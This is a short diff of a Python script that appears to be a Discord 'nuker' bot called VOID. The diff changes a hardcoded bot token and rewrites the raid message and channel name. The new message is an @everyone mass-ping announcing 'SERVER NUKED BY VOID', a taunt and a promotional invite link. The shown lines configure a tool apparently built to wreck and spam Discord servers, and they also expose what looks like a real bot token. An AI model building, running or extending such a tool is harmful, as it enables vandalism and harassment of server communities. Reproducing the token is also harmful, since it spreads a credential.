@@ -30,7 +30,7 @@ from rich.console import Group
 console = Console(highlight=False)
 
 # ── Token ─────────────────────────────────────────────────────────────────────
-TOKEN    = "MTQ2NjA5MTMwMTczNTg5NTA3MQ.GSO0wW.lkj78MNQFJnPhNCOrSbIfvi9s5PNnBae4uYWZ4"
+TOKEN    = "MTQ2NjA5MTMwMTczNTg5NTA3MQ.GnwR-p.gIVchDj8UsO0IUlO6_eFTw474j6HUGPtUBJOD0"
 BASE_URL = "https://discord.com/api/v10"
 HDRS     = {
     "Authorization": f"Bot {TOKEN}",
@@ -38,8 +38,8 @@ HDRS     = {
     "User-Agent":    "DiscordBot (void, 2.0)",
 }
 
-NUKE_MSG = "# ☢️ @everyone @here **SERVER NUKED BY VOID** ☢️"
-NUKE_CH  = "☢︱void-nuked"
+NUKE_MSG = "# ☢️ @everyone @here # SERVER NUKED BY VOID!! **EZ KIDDOS** > join now: https://discord.gg/hG7kuYV5X7 ☢️"
+NUKE_CH  = "☢︱NUKED-BY-VOID-KIDS"
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # STATS — thread-safe live counters
